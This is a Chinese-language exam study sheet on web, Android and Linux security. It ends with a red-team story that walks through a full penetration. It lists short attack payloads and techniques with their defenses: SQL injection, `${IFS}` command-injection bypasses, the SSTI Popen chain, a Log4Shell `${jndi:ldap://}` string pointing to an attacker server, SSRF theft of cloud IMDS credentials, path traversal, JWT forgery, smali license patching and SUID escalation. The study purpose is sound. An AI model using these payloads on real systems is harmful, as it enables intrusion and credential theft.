## 🔴 Web 伺服器端注入
- **SQLi 判型**：有回顯→**UNION**(欄數相同/型態相容/要回顯)；只有報錯→**Error**(`updatexml`)；回應兩種狀態→**Boolean 盲注**(二分 ⌈log₂字集⌉，128→7)；完全一致→**Time 盲注**。
- **延遲四兄弟**：MySQL `SLEEP`／PG `pg_sleep`／MSSQL `WAITFOR DELAY`／Oracle 無 SLEEP 用 `dbms_pipe`。
- **寬字節**(GBK+`%df'`)：高位 byte 把 `addslashes` 的反斜線 `\`(0x5C)吃進漢字 → 引號脫逸。UTF-8 不成立。
- **命令注入繞空格**：`${IFS}`、`<`、`{cmd,arg}`（`%20` 無效，進 shell 前已還原）。
- **SSTI**：`{{7*7}}`→49 是伺服器求值；Jinja2 `{{7*'7'}}`→`7777777`、Twig→`49`；逃逸鏈 `__class__→__mro__→__subclasses__→Popen`。
- **根本防禦**：參數化查詢(碼/值分離)+識別字白名單。WAF/addslashes/前端驗證都可繞。

## 🟠 前端跨站信任邊界（易混，釘死）
- **XSS 三型**：Reflected(當場反射)、Stored(存DB所有人中)、DOM(純前端 Source→Sink，`#` fragment 不送伺服器→WAF攔不到)。
- **防 XSS**：輸出編碼(根本)→CSP(擋執行)→HttpOnly(只減災)。**HttpOnly 不防 XSS，只防 cookie 被 JS 偷**。
- **CSP nonce**=一次性不可預測通行證；`strict-dynamic`=信任沿碼鏈傳遞+停用 host 白名單。CSP 不防 SQLi。
- **Cookie 旗標**：**HttpOnly→XSS減災｜SameSite→CSRF｜Secure→只走HTTPS**。`SameSite=None` **必須配 Secure**；Lax 是現代預設。
- **CSRF**(攻擊非防禦)：靠自動帶 cookie+無不可預測 token+已登入。防禦=CSRF Token+SameSite。
- **CORS**：管「**跨源讀回應**」。帶憑證必須具體 Origin(禁`*`)；漏洞=**未驗證就反射 Origin**+`credentials:true`。**不防 CSRF、不防 XSS**。
> 🧭 **信任邊界地圖**：跨源讀=CORS管｜跨站寫=CSRF管｜同源跑惡意碼=XSS管(輸出編碼/CSP)。XSS 讓攻擊者「變同源」→凌駕 CORS/CSRF。

## 🟡 架構 / 語意 / 供應鏈
- **SSRF**：`gopher://` 打內網 Redis；`169.254.169.254`=雲端 **IMDS** 偷 IAM 憑證→防 **IMDSv2**；**DNS Rebinding**(解析過檢查、連線再 rebind 內網,TOCTOU)。
- **反序列化**：PHP `__wakeup`/`__destruct`、Python `__reduce__`、Java `readObject`/**Log4Shell**(`${jndi:ldap://}` 遠端載類別 RCE)。JSON.parse 安全。
- **JWT**：Base64 非加密(勿放機敏)；`alg:none`；RS256→HS256 混淆(公鑰當 HMAC 金鑰)→防禦鎖 alg。
- **XXE**：`<!ENTITY xxe SYSTEM "file://">`+`&xxe;`；Blind 用外部 DTD+OOB 外帶。
- **走私** CL.TE/TE.CL(前端.後端信哪個)；**快取投毒**(unkeyed 輸入)；**Host 注入**(密碼重置投毒)。
- **401=未認證、403=已認證未授權**。安全標頭沒一個防 SQLi。
- **郵件**：SPF=TXT列IP、DKIM=簽章(非加密)、DMARC=對齊+處置。**OWASP 2025 新增**：供應鏈失效、例外處理不當。

## 🟣 檔案 / 上傳 / 路徑
- **LFI 讀源碼**：`php://filter/convert.base64-encode/resource=`。
- **穿越繞過**：`%2e%2e%2f`、`....//`(非遞迴過濾殘留)。
- **Apache** 副檔名右到左回退(`x.php.jpg` 可執行)；**Nginx alias** 無結尾斜線→`/files../` 穿越。
- **上傳繞過**：偽 Content-Type、改 Magic Bytes 夾 PHP、雙副檔名/空字元。
- **開放重定向**：未驗證跳轉參數，串釣魚/OAuth 竊 token/繞 SSRF 白名單。

## 🔵 Android / Java 逆向
- **APK=ZIP**：`AndroidManifest.xml`(二進位XML)、`classes.dex`(Dalvik位元碼)、`resources.arsc`、`lib/`(各ABI `.so`)。非明文 .java。
- **工具**：**讀邏輯 jadx**(dex→Java,不可回編)、**重打包 apktool**(改smali→`apktool b`→重簽)、**動態 Frida**(hook 繞驗證/root/SSL pinning)、看 class jd-gui。
- **Smali**：instance 方法 `p0`=this、`p1`=首參；`if-eqz`=等於0才跳(改它反轉驗證)；`const-string` 常藏 flag。
- **dex**(jadx) vs **so**(IDA/Ghidra 原生層)。**ProGuard** 改名瘦身但**不加密字串**(明文可見)。

## 🟢 通識（A 分攤）
- **Linux 權限**：rwx=4/2/1；**SUID=4000**(`rws`,`-perm -4000` 含有≠4000 相等,對目錄無效)、SGID=2000、Sticky=1000；Capabilities `getcap`。
- **Port**：21FTP 22SSH 23Telnet 25SMTP 53DNS 80HTTP 110POP3 143IMAP 161SNMP 389LDAP 443HTTPS 445SMB 3306MySQL 3389RDP。
- **雲端**：**資料+IAM 永遠客戶責任**；IaaS 客戶從 OS 起、SaaS 雲商管到 App。
- **隱寫**：音檔雜訊→**頻譜圖**；ZIP 偽加密→改旗標位；工具 steghide/zsteg/binwalk/exiftool。**Magic Bytes**：89PNG/FFD8JPG/%PDF/PK(ZIP)/MZ(PE)/7F(ELF)。
- **工具誘答**：gflags 非掃描、DIE 非 sqlmap、steghide 非反編譯。

## 📖 脈絡故事版 —「一次 Web 到 App 的完整滲透」
> 把所有考點用一條因果線串起來，順著讀一遍，概念就接起來了。**粗體=考點**。

你是紅隊，目標是一間公司的 Web 服務和它的 Android App，要一路打穿。

**第一步：敲伺服器的輸入。** 你先試每個輸入框能不能把「資料」變成「程式碼」——這就是**注入**的本質。在商品 id 注入 `'`，頁面噴 SQL 錯誤，確認有 **SQLi**。你判型：頁面會把查詢結果印出來→用 **UNION**（先 `ORDER BY` 試欄數、對齊型態、找回顯欄）；若只有「存在/不存在」兩種回應→**Boolean 盲注**（二分法每字元約 ⌈log₂字集⌉ 次）；若回應完全一樣→**Time 盲注**，用 `SLEEP(5)`（MySQL；MSSQL 是 `WAITFOR DELAY`、Oracle 沒 SLEEP）。遇到它用 `addslashes` 擋引號、又是 GBK 編碼？你送 **`%df'` 寬字節**，讓高位元組把反斜線吃進漢字，引號脫逸。另一個參數被塞進系統命令、但過濾了空格？你用 **`${IFS}`** 代替空格（`%20` 沒用，進 shell 前就被還原了）。再看到模板回顯——輸入 **`{{7*7}}` 得到 49**，確認 **SSTI**，順著 `__class__→__mro__→__subclasses__` 爬到 `subprocess.Popen` 達成 RCE。（這些若後端都用**參數化查詢**就全擋了——WAF、addslashes、前端驗證都能繞。）

**第二步：轉攻使用者（跨站信任邊界）。** 伺服器端打完，你轉頭騙使用者。留言欄沒做**輸出編碼**→你存一段 `<script>` 進去，所有看到貼文的人都中招，這是 **Stored XSS**（若是網址 `#` 後由前端 `innerHTML` 寫入、不經伺服器，就是 **DOM XSS**，伺服器 WAF 攔不到）。你想偷 cookie，但它設了 **HttpOnly**——注意：**HttpOnly 不是防 XSS，只是讓 JS 讀不到 cookie**；你的 XSS 照樣能用受害者身分發請求。於是你改打 **CSRF**：誘受害者點一個會自動帶 cookie 的請求——但它有 **CSRF Token（不可預測）** 和 **`SameSite` Cookie**，擋住了。你再看它的 API：回應把你的 **Origin 原樣反射**進 `Access-Control-Allow-Origin` 還附 `credentials:true`——**CORS 錯配**！你從自己的站就能帶著受害者 cookie 讀到它的私密回應。（記住這張地圖：**跨源讀=CORS、跨站寫=CSRF、同源跑碼=XSS**。）

**第三步：往架構深處鑽。** 有個「幫你抓圖」的功能讓伺服器去抓你給的 URL——**SSRF**。你填 `http://169.254.169.254/latest/meta-data/`（雲端 **IMDS**）偷到**臨時 IAM 憑證**（防禦本該是 **IMDSv2**）；它若先解析網域檢查非內網，你用 **DNS Rebinding**（檢查時回公網、連線時 rebind 內網）繞過。你還找到它用 Java、日誌會解析 **`${jndi:ldap://你的伺服器}`**——**Log4Shell**，遠端載入惡意類別 RCE。它的 **JWT** 只是 Base64 不是加密，你解開看內容，甚至試 `alg:none` 或 **RS256→HS256 混淆**偽造身分。檔案功能也能玩：**`php://filter`** 讀出原始碼、**`%2e%2e%2f`** 路徑穿越、上傳改 **Magic Bytes** 夾帶 PHP、鑽 **Apache 多副檔名 / Nginx alias 穿越**。

**第四步：拆它的 Android App。** 公司 App 是你的另一個入口。你把 **APK 當 ZIP 解開**（裡面是 `classes.dex` 位元碼、二進位的 `AndroidManifest.xml`、`lib/` 原生 `.so`，**不是明文 .java**）。用 **jadx** 把 dex 反編譯成近似 Java **讀登入邏輯**，看到一段 **smali**：`const-string v0, "flag{...}"` 後面 `equals` 比對再 **`if-eqz` 跳轉**——硬編碼驗證，flag 直接現形。想破解驗證？用 **apktool** 反編譯、把 `if-eqz` 改成 `if-nez`、`apktool b` 重打包再重簽。核心演算法藏在 `.so`？那要用 **IDA/Ghidra** 看原生層。它用 **ProGuard** 混淆了類別名——但 **ProGuard 不加密字串**，密鑰明文還在。嫌靜態麻煩？直接 **Frida** 在執行期 hook `checkLicense()` 強制回 true，繞過一切。

**第五步：落地與通識收尾。** 你透過 SSRF/RCE 進了那台 **Linux** 伺服器，低權限。找 **SUID** 檔（`find / -perm -4000`，減號=含有）對照 GTFOBins，或看 **Capabilities**（`getcap`）提權到 root。你盤點它開的 **埠**（22 SSH、3306 MySQL、6379 Redis…）找更多服務。因為前面偷到了 IMDS 憑證，你想起**雲端共同責任**——**資料與 IAM 永遠是客戶責任**，這組被偷的憑證就是客戶沒顧好。最後在它的圖床翻到一張「雜訊」音檔，開**頻譜圖**看到隱藏訊息；一個「加密」ZIP 其實是**偽加密**，改個旗標位就解開了。

**故事收束**：伺服器注入(SQLi判型/寬字節/命令/SSTI→參數化) → 跨站(XSS/HttpOnly真相/CSRF/CORS→信任邊界地圖) → 架構(SSRF/IMDS/Log4Shell/JWT/檔案) → Android(APK/jadx讀/apktool改/smali/Frida) → 落地通識(SUID提權/埠/雲端責任/隱寫)。一條線，全考點。

### 🧠 最後六句免疫
1. SQLi 判型：有回顯 UNION、兩狀態 Boolean、完全一致 Time；根治=參數化。
2. **HttpOnly 不防 XSS**(只防 cookie 被偷)；防 XSS=輸出編碼→CSP→HttpOnly。
3. 信任邊界：**跨源讀=CORS、跨站寫=CSRF、同源跑碼=XSS**；`SameSite=None` 必配 Secure。
4. SSRF→IMDS 偷憑證(防 IMDSv2)、gopher 打 Redis、DNS Rebinding；Log4Shell=`${jndi:ldap}`。
5. Android：**讀 jadx、改 apktool、動態 Frida**；`if-eqz`=等0跳、ProGuard 不加密字串。
6. 通識：SUID `-perm -4000`、資料+IAM 永遠客戶責任、音檔看頻譜圖、MZ=PE/7F=ELF。
